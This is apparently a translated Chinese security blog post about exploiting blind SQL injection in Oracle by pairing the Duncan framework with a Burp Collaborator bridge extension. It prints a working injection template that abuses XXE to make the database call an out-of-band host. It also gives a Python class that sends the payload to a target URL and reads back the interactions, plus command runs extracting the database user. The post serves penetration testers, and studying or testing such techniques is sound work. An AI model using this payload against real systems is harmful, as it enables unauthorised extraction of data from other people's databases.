通过Burp Collaborator插件利用SQL盲注

Mottoin Team • 2017年1月5日 • Web安全 • 阅读 1036

前言

我们大多数的渗透测试围绕Web应用程序多少会涉及数据库后端。 web应用程序通常用Burp套件更容易，Burp套件具有内置的扫描器，能够识别数据库的注入。 然而，检测只是需要完成工作的一半，一个好的渗透者会使用SQL注入或类似的数据库安全漏洞来扩大渗透测试的范围。 Burp不断改进其扫描引擎，但没有办法进一步利用这些漏洞，因此除了手动测试，大多数测试者使用独立工具。 由于Burp Suite 1.7.09提供的新功能，我们找到了一种方法，将Burp与我们的数据库开发框架相结合，产生了非常有趣的功能。

许多服务，比如Web应用程序和自定义应用程序API，都使用数据库后端，通常通过使用SQL进行操作。 SQL注入只是这个游戏的一部分，虽然有一些专门的工具来利用这样的漏洞，我们发现有时更简单的工具会导致更高的生产力，因此Duncan诞生了。在许多情况下它使利用SQL注入更容易，比如盲注和基于时间的SQL注入， 除此之外还有其他没有被广泛使用的方法。

PortSwigger在2015年4月宣布Burp Collaborator，这改变了游戏规则，因为它可以检测到带外交互。 它通过在其自己的域下运行多个服务器（DNS，HTTP，HTTPS及更高版本的SMTP），并在发送到服务器的有效负载中插入唯一的子域（例如rvqhg498gxa339ere9i1lby1dsji77.burpcollaborator.net），再监视上述服务器以查找这些子域的任何请求。这个方法比通过时间注入快得多（当不能延时注入时，这是唯一的方法），因此几个月后扫描仪引擎开始使用它。 我对2016年5月第三方工具使用Collaborator的可能性进行了调查，他们已经暗示了对开发者的回应。 10月，他们坚持了承诺，并最终添加了一个官方Collaborator API。

但是，这个API只能在Burp中使用，并且Duncan不是我想要用来适应Burp的。即使Burp支持使用Python和Ruby编写的插件，使用Jython和JRuby也可能会导致一些意想不到的复杂性。 所以我开始创建一个通用扩展，创建一个Burp Collaborator和任何外部程序的桥梁。 由于Burp在多个平台上运行，所以这样的扩展只有在它可以从多种编程语言轻松调用时才有用，所以我决定在TCP上使用MessagePack，出于安全原因，它仅在端口8452上绑定到localhost。

Burp Collaborator

这个GitHub存储库包含：

  • 使用纯Java编写的Burp Extender的源代码（2个简单类）
  • Python中最小示例客户端的源代码
  • 在README文件中协议的文本描述

虽然编译代码是相当简单的，一个编译的JAR文件可以从GitHub的版本页面下载。 现在它没有GUI，它绑定到硬编码端口，但是，它是MIT许可，所以pull请求是受欢迎的。 ;）

测试

使用这个工具，Oracle的渗透测试可以更容易。 就像我们经常引用的Oracle页面的描述，基于时间的注入在Oracle中并不容易，因为DBMSLOCK.SLEEP不能嵌入到SELECT语句中，其他解决方案需要UTLINADDR，URL_HTTP以及其他类似的。 然而，正如Burp开发人员所写的，“他们都需要我们可能没有的各种权限”。 但是，同一篇博文也描述了Oracle中的XXE漏洞，当与Collaborator结合使用时可能被滥用为辅助方法。

通过这些，可以构建以下Duncan类：

tpl = """'||(SELECT CASE WHEN ASCII(SUBSTR(({s._query}),{s._pos},1))<{guess} \
THEN extractValue(XMLType('<?xml version="1.0" encoding="UTF-8"?>\
<!DOCTYPE poc [ <!ENTITY % s2 SYSTEM "http://{payload}/">%s2;]>'),'/l') \
ELSE '' END FROM dual)||'"""
 
class OracleDuncan(duncan.Duncan):
 def decide(self, guess):
 c = Client()
 payload = c.generate_payload(include_location=True)
 requests.post(url, data={'q': tpl.format(s=self, guess=guess,
 payload=payload)}, allow_redirects=False)
 return c.fetch_collaborator_interactions_for(payload)

模板在Duncan中进行测试，并判断它的测试结果为true还是false，它调用一个XML操作，当且仅当表达式为真时，它发出信号给Collaborator。 Client类来自Python示例客户端，url包含目标Web应用程序，数据是POST方法中名为q的参数的值。

由于调用decision方法的Duncan框架仅测试返回值是否为“true”，因此我们可以直接返回Collaborator交互列表，因为Python中的列表被认为是“true”。如果它不为空，这意味着至少有一个在Collaborator注入xml中可使用的有效负载。

此方法不仅比传统的基于时间的利用（其涉及服务器上的有意延迟）更快，而且还允许多线程操作。 下面是一个使用Duncan和上面的类来提取数据库用户名的例子。

$ time python run_duncan.py --query 'SELECT user FROM dual' \
 --charset ABCDEFGHIJKLMNOPQRSTUVWXYZ --pos-start 1 --pos-end 5 \
 --use poc.OracleDuncan --threads 1
VSZA
5,33s user 0,03s system 27% cpu 19,518 total
$ time python run_duncan.py --query 'SELECT user FROM dual' \
 --charset ABCDEFGHIJKLMNOPQRSTUVWXYZ --pos-start 1 --pos-end 5 \
 --use poc.OracleDuncan --threads 2
VSZA
5,50s user 0,04s system 38% cpu 14,459 total
$ time python run_duncan.py --query 'SELECT user FROM dual' \
 --charset ABCDEFGHIJKLMNOPQRSTUVWXYZ --pos-start 1 --pos-end 5 \
 --use poc.OracleDuncan --threads 5
VSZA
5,54s user 0,07s system 50% cpu 11,165 total

从上面可以看出，2个线程将运行时间提高了25％，而5个线程比单线程版本提高了40％以上。 在测试设置中，将线程数提高到5以上时速度不会有任何提高，但这可能是因为测试服务的性质。

我们希望我们发布的Burp Extender插件可以使Collaborator桥接其他伟大的工具，从而成功利用以前认为只能盲注的漏洞，并扩大渗透测试的覆盖范围
